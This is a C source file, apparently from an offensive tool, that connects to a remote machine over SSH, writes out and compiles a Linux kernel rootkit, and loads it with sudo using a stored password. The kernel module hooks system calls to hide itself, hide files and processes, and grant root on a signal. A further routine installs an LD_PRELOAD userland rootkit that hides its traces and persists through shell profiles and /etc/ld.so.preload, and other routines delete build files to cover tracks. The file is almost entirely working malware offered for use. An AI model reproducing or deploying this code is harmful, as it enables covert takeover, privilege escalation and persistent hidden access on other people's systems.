#include "rootkit.h"
#include <stdio.h>
#include <string.h>
#include <limits.h>

extern char *global_password;

// ==================== Rootkit Functions ====================

int create_and_compile_rootkit(ssh_session session) {
    printf("[*] Creating and compiling rootkit on remote machine...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    printf("[*] Creating ftrace_helper.h...\n");
    const char *ftrace_helper_part1 = 
        "cat > /tmp/ftrace_helper.h << 'EOFHEADER'\n"
        "#include <linux/ftrace.h>\n"
        "#include <linux/linkage.h>\n"
        "#include <linux/slab.h>\n"
        "#include <linux/uaccess.h>\n"
        "#include <linux/version.h>\n"
        "\n"
        "#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))\n"
        "#define PTREGS_SYSCALL_STUBS 1\n"
        "#endif\n"
        "\n"
        "#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n"
        "#define KPROBE_LOOKUP 1\n"
        "#include <linux/kprobes.h>\n"
        "static struct kprobe kp = {\n"
        "    .symbol_name = \"kallsyms_lookup_name\"\n"
        "};\n"
        "#endif\n"
        "\n"
        "#define HOOK(_name, _hook, _orig) { .name = (_name), .function = (_hook), .original = (_orig) }\n"
        "\n"
        "#define USE_FENTRY_OFFSET 0\n"
        "#if !USE_FENTRY_OFFSET\n"
        "#pragma GCC optimize(\"-fno-optimize-sibling-calls\")\n"
        "#endif\n"
        "\n"
        "struct ftrace_hook {\n"
        "    const char *name;\n"
        "    void *function;\n"
        "    void *original;\n"
        "    unsigned long address;\n"
        "    struct ftrace_ops ops;\n"
        "};\n"
        "EOFHEADER\n";
    
    ssh_channel_write(channel, ftrace_helper_part1, strlen(ftrace_helper_part1));
    usleep(2000000);
    
    const char *ftrace_helper_part2 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER2'\n"
        "static int fh_resolve_hook_address(struct ftrace_hook *hook)\n"
        "{\n"
        "#ifdef KPROBE_LOOKUP\n"
        "    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n"
        "    kallsyms_lookup_name_t kallsyms_lookup_name;\n"
        "    register_kprobe(&kp);\n"
        "    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n"
        "    unregister_kprobe(&kp);\n"
        "#endif\n"
        "    hook->address = kallsyms_lookup_name(hook->name);\n"
        "    if (!hook->address) {\n"
        "        printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook->name);\n"
        "        return -ENOENT;\n"
        "    }\n"
        "#if USE_FENTRY_OFFSET\n"
        "    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;\n"
        "#else\n"
        "    *((unsigned long*) hook->original) = hook->address;\n"
        "#endif\n"
        "    return 0;\n"
        "}\n"
        "EOFHEADER2\n";
    
    ssh_channel_write(channel, ftrace_helper_part2, strlen(ftrace_helper_part2));
    usleep(2000000);
    
    const char *ftrace_helper_part3 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER3'\n"
        "#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)\n"
        "static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,\n"
        "                                   struct ftrace_ops *ops, struct ftrace_regs *fregs)\n"
        "{\n"
        "    struct pt_regs *regs;\n"
        "    if (!fregs) return;\n"
        "    regs = ftrace_get_regs(fregs);\n"
        "    if (!regs) return;\n"
        "#else\n"
        "static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,\n"
        "                                   struct ftrace_ops *ops, struct pt_regs *regs)\n"
        "{\n"
        "    if (!regs) return;\n"
        "#endif\n"
        "    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n"
        "#if USE_FENTRY_OFFSET\n"
        "    regs->ip = (unsigned long)hook->function;\n"
        "#else\n"
        "    if (!within_module(parent_ip, THIS_MODULE))\n"
        "        regs->ip = (unsigned long)hook->function;\n"
        "#endif\n"
        "}\n"
        "EOFHEADER3\n";
    
    ssh_channel_write(channel, ftrace_helper_part3, strlen(ftrace_helper_part3));
    usleep(2000000);
    
    const char *ftrace_helper_part4 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER4'\n"
        "int fh_install_hook(struct ftrace_hook *hook)\n"
        "{\n"
        "    int err;\n"
        "    err = fh_resolve_hook_address(hook);\n"
        "    if(err) return err;\n"
        "    hook->ops.func = fh_ftrace_thunk;\n"
        "    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;\n"
        "    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);\n"
        "    if(err) {\n"
        "        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n"
        "        return err;\n"
        "    }\n"
        "    err = register_ftrace_function(&hook->ops);\n"
        "    if(err) {\n"
        "        printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n"
        "        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);\n"
        "        return err;\n"
        "    }\n"
        "    return 0;\n"
        "}\n"
        "EOFHEADER4\n";
    
    ssh_channel_write(channel, ftrace_helper_part4, strlen(ftrace_helper_part4));
    usleep(2000000);
    
    const char *ftrace_helper_part5 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER5'\n"
        "void fh_remove_hook(struct ftrace_hook *hook)\n"
        "{\n"
        "    int err;\n"
        "    err = unregister_ftrace_function(&hook->ops);\n"
        "    if(err) printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n"
        "    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);\n"
        "    if(err) printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n"
        "}\n"
        "\n"
        "int fh_install_hooks(struct ftrace_hook *hooks, size_t count)\n"
        "{\n"
        "    int err;\n"
        "    size_t i;\n"
        "    for (i = 0 ; i < count ; i++) {\n"
        "        err = fh_install_hook(&hooks[i]);\n"
        "        if(err) goto error;\n"
        "    }\n"
        "    return 0;\n"
        "error:\n"
        "    while (i != 0) {\n"
        "        fh_remove_hook(&hooks[--i]);\n"
        "    }\n"
        "    return err;\n"
        "}\n"
        "\n"
        "void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)\n"
        "{\n"
        "    size_t i;\n"
        "    for (i = 0 ; i < count ; i++)\n"
        "        fh_remove_hook(&hooks[i]);\n"
        "}\n"
        "EOFHEADER5\n";
    
    ssh_channel_write(channel, ftrace_helper_part5, strlen(ftrace_helper_part5));
    usleep(2000000);
    
    printf("[*] Creating rootkit.c...\n");
    const char *rootkit_c_part1 = 
        "cat > /tmp/boogaloo_rootkit.c << 'EOFCODE'\n"
        "#include <linux/init.h>\n"
        "#include <linux/module.h>\n"
        "#include <linux/kernel.h>\n"
        "#include <linux/syscalls.h>\n"
        "#include <linux/kallsyms.h>\n"
        "#include <linux/dirent.h>\n"
        "#include <linux/version.h>\n"
        "#include <linux/fs.h>\n"
        "#include <linux/uaccess.h>\n"
        "#include <linux/string.h>\n"
        "\n"
        "#include \"ftrace_helper.h\"\n"
        "\n"
        "MODULE_LICENSE(\"GPL\");\n"
        "MODULE_AUTHOR(\"TheXcellerator && lain0xff\");\n"
        "MODULE_DESCRIPTION(\"Combined rootkit\");\n"
        "MODULE_VERSION(\"1.00\");\n"
        "\n"
        "#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))\n"
        "#define PTREGS_SYSCALL_STUBS 1\n"
        "#endif\n"
        "\n"
        "#define PREFIX \"boogaloo\"\n"
        "#define SIGNAL_HIDE_SHOW    64\n"
        "#define SIGNAL_ROOT         63\n"
        "#define SIGNAL_HIDE_PROCESS 62\n"
        "\n"
        "static struct list_head *prev_module;\n"
        "static short hidden = 0;\n"
        "char hide_pid[NAME_MAX];\n"
        "EOFCODE\n";
    
    ssh_channel_write(channel, rootkit_c_part1, strlen(rootkit_c_part1));
    usleep(2000000);
    
    const char *rootkit_c_part2 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE2'\n"
        "#ifdef PTREGS_SYSCALL_STUBS\n"
        "static asmlinkage long (*orig_kill)(const struct pt_regs *);\n"
        "static asmlinkage long (*orig_getdents64)(const struct pt_regs *);\n"
        "\n"
        "asmlinkage int hook_kill(const struct pt_regs *regs)\n"
        "{\n"
        "    pid_t pid = regs->di;\n"
        "    int sig = regs->si;\n"
        "\n"
        "    if (sig == SIGNAL_HIDE_SHOW) {\n"
        "        if (hidden == 0) {\n"
        "            printk(KERN_INFO \"rootkit: hiding module\\n\");\n"
        "            prev_module = THIS_MODULE->list.prev;\n"
        "            list_del(&THIS_MODULE->list);\n"
        "            hidden = 1;\n"
        "        } else {\n"
        "            printk(KERN_INFO \"rootkit: showing module\\n\");\n"
        "            list_add(&THIS_MODULE->list, prev_module);\n"
        "            hidden = 0;\n"
        "        }\n"
        "        return 0;\n"
        "    } else if (sig == SIGNAL_ROOT) {\n"
        "        struct cred *root;\n"
        "        printk(KERN_INFO \"rootkit: giving root\\n\");\n"
        "        root = prepare_creds();\n"
        "        if (root == NULL) return orig_kill(regs);\n"
        "        root->uid.val = root->gid.val = 0;\n"
        "        root->euid.val = root->egid.val = 0;\n"
        "        root->suid.val = root->sgid.val = 0;\n"
        "        root->fsuid.val = root->fsgid.val = 0;\n"
        "        commit_creds(root);\n"
        "        return 0;\n"
        "    } else if (sig == SIGNAL_HIDE_PROCESS) {\n"
        "        sprintf(hide_pid, \"%d\", pid);\n"
        "        return 0;\n"
        "    }\n"
        "    return orig_kill(regs);\n"
        "}\n"
        "#endif\n"
        "EOFCODE2\n";
    
    ssh_channel_write(channel, rootkit_c_part2, strlen(rootkit_c_part2));
    usleep(2000000);
    
    const char *rootkit_c_part3 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE3'\n"
        "#ifdef PTREGS_SYSCALL_STUBS\n"
        "asmlinkage int hook_getdents64(const struct pt_regs *regs)\n"
        "{\n"
        "    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;\n"
        "    long error;\n"
        "    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;\n"
        "    unsigned long offset = 0;\n"
        "\n"
        "    int ret = orig_getdents64(regs);\n"
        "    dirent_ker = kzalloc(ret, GFP_KERNEL);\n"
        "\n"
        "    if ((ret <= 0) || (dirent_ker == NULL))\n"
        "        return ret;\n"
        "\n"
        "    error = copy_from_user(dirent_ker, dirent, ret);\n"
        "    if (error) goto done;\n"
        "\n"
        "    while (offset < ret) {\n"
        "        current_dir = (void *)dirent_ker + offset;\n"
        "        if ((memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) ||\n"
        "            ((strlen(hide_pid) > 0) && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0))) {\n"
        "            if (current_dir == dirent_ker) {\n"
        "                ret -= current_dir->d_reclen;\n"
        "                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);\n"
        "                continue;\n"
        "            }\n"
        "            previous_dir->d_reclen += current_dir->d_reclen;\n"
        "        } else {\n"
        "            previous_dir = current_dir;\n"
        "        }\n"
        "        offset += current_dir->d_reclen;\n"
        "    }\n"
        "\n"
        "    error = copy_to_user(dirent, dirent_ker, ret);\n"
        "done:\n"
        "    kfree(dirent_ker);\n"
        "    return ret;\n"
        "}\n"
        "#endif\n"
        "EOFCODE3\n";
    
    ssh_channel_write(channel, rootkit_c_part3, strlen(rootkit_c_part3));
    usleep(2000000);
    
    const char *rootkit_c_part4 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE4'\n"
        "static struct ftrace_hook hooks[] = {\n"
        "    HOOK(\"__x64_sys_kill\", hook_kill, &orig_kill),\n"
        "    HOOK(\"__x64_sys_getdents64\", hook_getdents64, &orig_getdents64),\n"
        "};\n"
        "\n"
        "static int __init rootkit_init(void)\n"
        "{\n"
        "    int err;\n"
        "    memset(hide_pid, 0, NAME_MAX);\n"
        "    pr_info(\"rootkit: Loading combined rootkit module\\n\");\n"
        "    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));\n"
        "    if(err) {\n"
        "        pr_err(\"rootkit: Failed to install hooks: %d\\n\", err);\n"
        "        return err;\n"
        "    }\n"
        "    printk(KERN_INFO \"rootkit: Combined rootkit loaded\\n\");\n"
        "    return 0;\n"
        "}\n"
        "\n"
        "static void __exit rootkit_exit(void)\n"
        "{\n"
        "    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));\n"
        "    printk(KERN_INFO \"rootkit: Combined rootkit unloaded\\n\");\n"
        "}\n"
        "\n"
        "module_init(rootkit_init);\n"
        "module_exit(rootkit_exit);\n"
        "EOFCODE4\n";
    
    ssh_channel_write(channel, rootkit_c_part4, strlen(rootkit_c_part4));
    usleep(2000000);
    
    printf("[*] Creating Makefile...\n");
    const char *makefile_cmd = "printf 'obj-m += boogaloo_rootkit.o\\n\\nall:\\n\\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\\n\\nclean:\\n\\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\\n' > /tmp/Makefile\n";
    ssh_channel_write(channel, makefile_cmd, strlen(makefile_cmd));
    usleep(1000000);
    
    printf("[*] Checking for kernel headers...\n");
    const char *check_headers = "ls -la /lib/modules/$(uname -r)/build/ 2>&1 || echo 'NO_KERNEL_HEADERS'\n";
    ssh_channel_write(channel, check_headers, strlen(check_headers));
    usleep(2000000);
    
    const char *install_headers = "if [ ! -d /lib/modules/$(uname -r)/build ]; then "
                                 "echo '[*] Installing kernel headers...'; "
                                 "apt-get update >/dev/null 2>&1 && apt-get install -y linux-headers-$(uname -r) >/dev/null 2>&1 || "
                                 "yum install -y kernel-devel-$(uname -r) >/dev/null 2>&1 || "
                                 "echo 'Failed to install headers'; fi\n";
    ssh_channel_write(channel, install_headers, strlen(install_headers));
    usleep(5000000);
    
    printf("[*] Compiling rootkit...\n");
    const char *compile_cmd = "cd /tmp && make 2>&1\n";
    ssh_channel_write(channel, compile_cmd, strlen(compile_cmd));
    usleep(5000000);
    
    const char *check_compile = "ls -la /tmp/boogaloo_rootkit.ko 2>/dev/null && echo 'COMPILATION_SUCCESS' || echo 'COMPILATION_FAILED'\n";
    ssh_channel_write(channel, check_compile, strlen(check_compile));
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int timeout = 30;
    int compilation_success = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "COMPILATION_SUCCESS")) {
                compilation_success = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return compilation_success ? 0 : -1;
}

int reliable_rootkit_load(ssh_session session, const char *rootkit_path) {
    printf("[*] Using reliable rootkit loading method...\n");
    
    if (!session || !rootkit_path) {
        fprintf(stderr, "[-] Invalid parameters\n");
        return -1;
    }
    
    if (!global_password) {
        fprintf(stderr, "[-] No password available\n");
        return -1;
    }
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "[-] Failed to create channel\n");
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "[-] Failed to open channel\n");
        ssh_channel_free(channel);
        return -1;
    }
    
    // Используем -S для чтения пароля из stdin
    char command[1024];
    snprintf(command, sizeof(command),
        "echo '%s' | sudo -S /sbin/insmod '%s' 2>&1 && echo 'LOAD_SUCCESS' || echo 'LOAD_FAILED'\n",
        global_password, rootkit_path);
    
    printf("[*] Executing: %s\n", command);
    
    if (ssh_channel_request_exec(channel, command) == SSH_OK) {
        char buffer[2048];
        int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("Output: %s\n", buffer);
            
            if (strstr(buffer, "LOAD_SUCCESS")) {
                printf("[+] Rootkit loaded successfully\n");
                ssh_channel_close(channel);
                ssh_channel_free(channel);
                return 0;
            }
        }
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return -1;
}

int deploy_rootkit_with_vim(ssh_session session) {
    printf("[*] Deploying rootkit with sudo password...\n");
    
    if (create_and_compile_rootkit(session) != 0) {
        fprintf(stderr, "[-] Failed to create and compile rootkit\n");
        return -1;
    }
    
    const char *rootkit_path = "/tmp/boogaloo_rootkit.ko";
    printf("[+] Using rootkit path: %s\n", rootkit_path);
    
    // Используем улучшенную функцию с sudo
    if (load_rootkit_with_sudo(session, rootkit_path) == 0) {
        printf("[+] Rootkit deployed successfully\n");
        return 0;
    }
    
    fprintf(stderr, "[-] Rootkit deployment failed\n");
    return -1;
}

int execute_with_sudo_password(ssh_session session, const char *command) {
    if (!global_password) {
        fprintf(stderr, "[-] No password available for sudo\n");
        return -1;
    }
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    // Создаем скрипт который передаст пароль в sudo
    char full_command[2048];
    snprintf(full_command, sizeof(full_command),
        "#!/bin/bash\n"
        "echo '%s' | sudo -S %s\n"
        "exit $?\n",
        global_password, command);
    
    char remote_script[4096];
    snprintf(remote_script, sizeof(remote_script),
        "cat > /tmp/.sudo_script.sh << 'EOF'\n%sEOF\n"
        "chmod +x /tmp/.sudo_script.sh\n"
        "bash /tmp/.sudo_script.sh\n"
        "RESULT=$?\n"
        "rm -f /tmp/.sudo_script.sh\n"
        "exit $RESULT\n",
        full_command);
    
    if (ssh_channel_request_exec(channel, remote_script) == SSH_OK) {
        char buffer[4096];
        int nbytes;
        int success = 0;
        
        while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            // Проверяем на успешное выполнение по коду возврата
            if (strstr(buffer, "insmod: module loaded") || 
                strstr(buffer, "boogaloo_rootkit")) {
                success = 1;
            }
        }
        
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return success ? 0 : -1;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return -1;
}

int load_rootkit_with_sudo(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit with sudo password...\n");
    
    if (!global_password) {
        fprintf(stderr, "[-] No password available\n");
        return -1;
    }
    
    char command[512];
    snprintf(command, sizeof(command), "/sbin/insmod %s", rootkit_path);
    
    if (execute_with_sudo_password(session, command) == 0) {
        printf("[*] Verifying module load...\n");
        
        // Проверяем загрузку
        ssh_channel verify_channel = ssh_channel_new(session);
        if (verify_channel && ssh_channel_open_session(verify_channel) == SSH_OK) {
            if (ssh_channel_request_exec(verify_channel, 
                "lsmod | grep boogaloo || cat /proc/modules | grep boogaloo") == SSH_OK) {
                char buffer[1024];
                int nbytes = ssh_channel_read(verify_channel, buffer, sizeof(buffer) - 1, 0);
                if (nbytes > 0) {
                    buffer[nbytes] = '\0';
                    printf("Verification: %s", buffer);
                    
                    if (strstr(buffer, "boogaloo")) {
                        printf("[+] Rootkit loaded and verified\n");
                        ssh_channel_close(verify_channel);
                        ssh_channel_free(verify_channel);
                        return 0;
                    }
                }
            }
            ssh_channel_close(verify_channel);
            ssh_channel_free(verify_channel);
        }
    }
    
    printf("[-] Rootkit loading failed\n");
    return -1;
}

int cleanup_rootkit_files(ssh_session session) {
    printf("[*] Cleaning up rootkit files...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *cleanup_cmd = "cd /tmp && rm -f boogaloo_rootkit.c ftrace_helper.h Makefile "
                             "boogaloo_rootkit.mod.c boogaloo_rootkit.mod.o boogaloo_rootkit.o "
                             "modules.order Module.symvers .boogaloo_rootkit.* 2>/dev/null; "
                             "echo 'Cleanup completed'\n";
    
    ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
    usleep(2000000);
    
    char buffer[1024];
    int timeout = 5;
    while (timeout > 0) {
        int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return 0;
}

int verify_rootkit_loaded(ssh_session session) {
    printf("[*] Verifying rootkit loading through multiple methods...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    // Проверяем разными способами
    const char *check_commands[] = {
        "dmesg | tail -20 | grep -i 'rootkit\\|boogaloo'",
        "cat /proc/modules | grep boogaloo",
        "lsmod | grep boogaloo", 
        "find /sys/module -name '*boogaloo*' 2>/dev/null",
        "sudo cat /sys/module/boogaloo_rootkit/refcnt 2>/dev/null",
        NULL
    };
    
    int found = 0;
    for (int i = 0; check_commands[i]; i++) {
        ssh_channel verify_channel = ssh_channel_new(session);
        if (verify_channel && ssh_channel_open_session(verify_channel) == SSH_OK) {
            if (ssh_channel_request_exec(verify_channel, check_commands[i]) == SSH_OK) {
                char buffer[1024];
                int nbytes = ssh_channel_read(verify_channel, buffer, sizeof(buffer) - 1, 0);
                if (nbytes > 0) {
                    buffer[nbytes] = '\0';
                    if (strlen(buffer) > 0) {
                        printf("[+] Rootkit detected via: %s\n", check_commands[i]);
                        printf("Output: %s\n", buffer);
                        found = 1;
                    }
                }
            }
            ssh_channel_close(verify_channel);
            ssh_channel_free(verify_channel);
        }
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return found ? 0 : -1;
}

int load_rootkit_direct_ssh(ssh_session session, const char *rootkit_path) {
    printf("[*] Attempting rootkit loading...\n");
    
    char *password = global_password;
    
    if (!password || strlen(password) == 0) {
        printf("[-] No password available\n");
        return -1;
    }
    
    // Метод: echo password в sudo
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    char command[1024];
    snprintf(command, sizeof(command),
             "echo '%s' | sudo -S /sbin/insmod %s 2>&1\n",
             password, rootkit_path);
    
    if (ssh_channel_request_exec(channel, command) == SSH_OK) {
        char buffer[1024];
        int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("insmod output: %s\n", buffer);
        }
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    // Проверяем загрузку через разные методы
    printf("[*] Verifying module load...\n");
    if (verify_rootkit_loaded(session) == 0) {
        printf("[+] Rootkit verified as loaded\n");
        return 0;
    }
    
    printf("[-] Rootkit may not be loaded or is completely hidden\n");
    return -1;
}

int deploy_userland_rootkit(ssh_session session) {
    printf("[*] Deploying userland rootkit using LD_PRELOAD...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char userland_rootkit[8192];
    snprintf(userland_rootkit, sizeof(userland_rootkit),
             "cat > /tmp/.userland_rootkit.c << 'EOFLIB'\n"
             "#define _GNU_SOURCE\n"
             "#include <stdio.h>\n"
             "#include <dlfcn.h>\n"
             "#include <dirent.h>\n"
             "#include <string.h>\n"
             "#include <unistd.h>\n"
             "#include <sys/stat.h>\n"
             "#include <sys/types.h>\n"
             "\n"
             "struct dirent *readdir(DIR *dirp) {\n"
             "    static struct dirent *(*original_readdir)(DIR *) = NULL;\n"
             "    struct dirent *result;\n"
             "    \n"
             "    if (!original_readdir) {\n"
             "        original_readdir = dlsym(RTLD_NEXT, \"readdir\");\n"
             "    }\n"
             "    \n"
             "    do {\n"
             "        result = original_readdir(dirp);\n"
             "        if (result && strstr(result->d_name, \"boogaloo\")) {\n"
             "            continue;\n"
             "        }\n"
             "        break;\n"
             "    } while (result);\n"
             "    \n"
             "    return result;\n"
             "}\n"
             "\n"
             "FILE *fopen(const char *pathname, const char *mode) {\n"
             "    static FILE *(*original_fopen)(const char *, const char *) = NULL;\n"
             "    \n"
             "    if (!original_fopen) {\n"
             "        original_fopen = dlsym(RTLD_NEXT, \"fopen\");\n"
             "    }\n"
             "    \n"
             "    if (pathname && strcmp(pathname, \"/proc/modules\") == 0) {\n"
             "        system(\"grep -v boogaloo /proc/modules > /tmp/.filtered_modules 2>/dev/null\");\n"
             "        return original_fopen(\"/tmp/.filtered_modules\", mode);\n"
             "    }\n"
             "    \n"
             "    return original_fopen(pathname, mode);\n"
             "}\n"
             "\n"
             "__attribute__((constructor))\n"
             "void init_rootkit() {\n"
             "    system(\"echo 'export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD' >> ~/.bashrc 2>/dev/null\");\n"
             "    system(\"echo 'export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD' >> ~/.profile 2>/dev/null\");\n"
             "}\n"
             "EOFLIB\n");
    
    ssh_channel_write(channel, userland_rootkit, strlen(userland_rootkit));
    usleep(2000000);
    
    const char *compile_cmd = "gcc -shared -fPIC -o /tmp/.userland_rootkit.so /tmp/.userland_rootkit.c -ldl 2>&1\n";
    ssh_channel_write(channel, compile_cmd, strlen(compile_cmd));
    usleep(2000000);
    
    const char *setup_preload = "export LD_PRELOAD=/tmp/.userland_rootkit.so:$LD_PRELOAD\n";
    ssh_channel_write(channel, setup_preload, strlen(setup_preload));
    usleep(500000);
    
    const char *test_cmd = "echo 'Testing userland rootkit...'; ls /tmp/ | grep -c boogaloo; echo 'Should show 0 if working'\n";
    ssh_channel_write(channel, test_cmd, strlen(test_cmd));
    usleep(2000000);
    
    const char *system_preload = "echo '/tmp/.userland_rootkit.so' >> /etc/ld.so.preload 2>/dev/null || echo 'Cannot write to /etc/ld.so.preload'\n";
    ssh_channel_write(channel, system_preload, strlen(system_preload));
    usleep(1000000);
    
    char buffer[4096];
    int nbytes;
    int timeout = 15;
    int success = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "userland_rootkit.so") && !strstr(buffer, "error")) {
                success = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    const char *cleanup = "rm -f /tmp/.userland_rootkit.c\n";
    ssh_channel_write(channel, cleanup, strlen(cleanup));
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return success ? 0 : -1;
}

